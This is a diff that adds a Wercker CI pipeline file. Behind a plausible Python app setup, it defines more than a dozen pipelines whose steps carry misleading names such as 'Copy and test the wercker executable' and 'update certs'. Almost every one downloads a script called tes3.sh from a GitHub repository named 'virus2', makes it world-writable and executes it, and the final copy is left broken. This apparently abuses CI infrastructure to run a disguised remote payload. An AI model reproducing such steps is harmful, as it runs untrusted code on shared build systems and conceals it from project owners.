@@ -1,0 +1,352 @@
+box:
+  id: python:2.7-slim
+  username: $DOCKERHUB_USERNAME
+  password: $DOCKERHUB_ACCESS_TOKEN
+  ports:
+    - "5000"
+
+
+dev:
+  steps:
+    - pip-install
+    - internal/watch:
+        code: python app.py
+        reload: true
+        
+# Build definition
+build:
+  # The steps that will be executed on build
+  steps:
+    # A step that executes `pip install` command
+    #- pip-install
+
+    # A custom script step, name value is used in the UI
+    # and the code value contains the command that get executed
+    - script:
+        name: python unit test
+        code: |
+          # python app_test.py
+
+
+# This pipeline runs the Wercker integration tests in test-all.sh
+integration-tests:
+  box: 
+      id: python:2.7-slim
+      username: $DOCKERHUB_USERNAME
+      password: $DOCKERHUB_ACCESS_TOKEN
+      ports:
+         - "5000"
+
+  steps:
+    - script:
+        name: Copy and test the wercker executable
+        code: |
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+                         
+
+    
+deploy:
+  box: 
+      id : ubuntu
+      username: $DOCKERHUB_USERNAME
+      password: $DOCKERHUB_ACCESS_TOKEN
+
+
+  steps:
+    - script:
+        name: update certs
+        code: |
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               
+
+    
+#
+
+run-tests:
+  box:
+    id: ruby:latest
+    username: $DOCKERHUB_USERNAME
+    password: $DOCKERHUB_ACCESS_TOKEN
+
+    #volumes: $CODE_PATH /var/run/docker.sock
+  steps:
+      - script:
+          code: |
+                 apt-get -y update
+                 apt-get -y install git
+                 apt-get -y install wget 
+                 wget --version
+                 wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+                 
+integration-tests1:
+  box: 
+      id: ruby:latest
+      username: $DOCKERHUB_USERNAME
+      password: $DOCKERHUB_ACCESS_TOKEN
+      ports:
+         - "8080"
+
+
+  steps:
+    - script:
+        name: Copy and test the wercker executable
+        code: |
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+
+deploy3:
+    box: google/golang
+    steps:
+    # use the scratch step to build a container from scratch based on the files present
+    - internal/docker-scratch-push:
+        username: $QUAY_USERNAME
+        password: $QUAY_PASSWORD
+        name: mana
+        code: |
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+        tag: $WERCKER_GIT_COMMIT
+        ports: "5000"
+        repository: quay.io/wercker/wercker-kubernetes-quay
+        registry: https://quay.io
+
+integration-tests2:
+  box: 
+      id: google/golang
+      username: $DOCKERHUB_USERNAME
+      password: $DOCKERHUB_ACCESS_TOKEN
+      ports:
+         - "8080"
+
+  dev:
+   steps:
+    - script:
+        name: Copy and test the wercker executable
+        code: |
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               
+integration-tests3:
+  box: 
+      id: php
+      username: $DOCKERHUB_USERNAME
+      password: $DOCKERHUB_ACCESS_TOKEN
+      ports:
+         - "8080"
+
+
+  steps:
+    - script:
+        name: Copy and test the wercker executable
+        code: |
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+
+deploy1:
+  box: 
+      id : ubuntu
+      username: $DOCKERHUB_USERNAME
+      password: $DOCKERHUB_ACCESS_TOKEN
+
+
+  steps:
+    - script:
+        name: update certs
+        code: |
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               
+
+    
+#
+
+run-tests1:
+  box:
+    id: ruby:latest
+    username: $DOCKERHUB_USERNAME
+    password: $DOCKERHUB_ACCESS_TOKEN
+
+    #volumes: $CODE_PATH /var/run/docker.sock
+  steps:
+      - script:
+          code: |
+                 apt-get -y update
+                 apt-get -y install git
+                 apt-get -y install wget 
+                 wget --version
+                 wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+                 
+integration-tests4:
+  box: 
+      id: ruby:latest
+      username: $DOCKERHUB_USERNAME
+      password: $DOCKERHUB_ACCESS_TOKEN
+      ports:
+         - "8080"
+
+
+  steps:
+    - script:
+        name: Copy and test the wercker executable
+        code: |
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               
+integration-tests5:
+  box: 
+      id: node:latest
+      username: $DOCKERHUB_USERNAME
+      password: $DOCKERHUB_ACCESS_TOKEN
+      ports:
+         - "8080"
+
+
+  steps:
+    - script:
+        name: Copy and test the wercker executable
+        code: |
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               
+integration-tests6:
+  box: 
+      id: php
+      username: $DOCKERHUB_USERNAME
+      password: $DOCKERHUB_ACCESS_TOKEN
+      ports:
+         - "8080"
+
+
+  steps:
+    - script:
+        name: Copy and test the wercker executable
+        code: |
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+
+deploy2:
+  box: 
+      id : ubuntu
+      username: $DOCKERHUB_USERNAME
+      password: $DOCKERHUB_ACCESS_TOKEN
+
+
+  steps:
+    - script:
+        name: update certs
+        code: |
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               
+
+    
+#
+
+run-tests2:
+  box:
+    id: ruby:latest
+    username: $DOCKERHUB_USERNAME
+    password: $DOCKERHUB_ACCESS_TOKEN
+
+
+    #volumes: $CODE_PATH /var/run/docker.sock
+  steps:
+      - script:
+          code: |
+                 apt-get -y update
+                 apt-get -y install git
+                 apt-get -y install wget 
+                 wget --version
+                 wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+                 
+integration-tests7:
+  box: 
+      id: ruby:latest
+      username: $DOCKERHUB_USERNAME
+      password: $DOCKERHUB_ACCESS_TOKEN
+      ports:
+         - "8080"
+
+
+  steps:
+    - script:
+        name: Copy and test the wercker executable
+        code: |
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               
+integration-tests8:
+  box: 
+      id: node:latest
+      username: $DOCKERHUB_USERNAME
+      password: $DOCKERHUB_ACCESS_TOKEN
+      ports:
+         - "8080"
+
+
+  steps:
+    - script:
+        name: Copy and test the wercker executable
+        code: |
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               
+integration-tests9:
+  box: 
+      id: php
+      username: $DOCKERHUB_USERNAME
+      password: $DOCKERHUB_ACCESS_TOKEN
+      ports:
+         - "8080"
+
+  
+  steps:
+    - script:
+        name: Copy and test the wercker executable
+        code: |
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
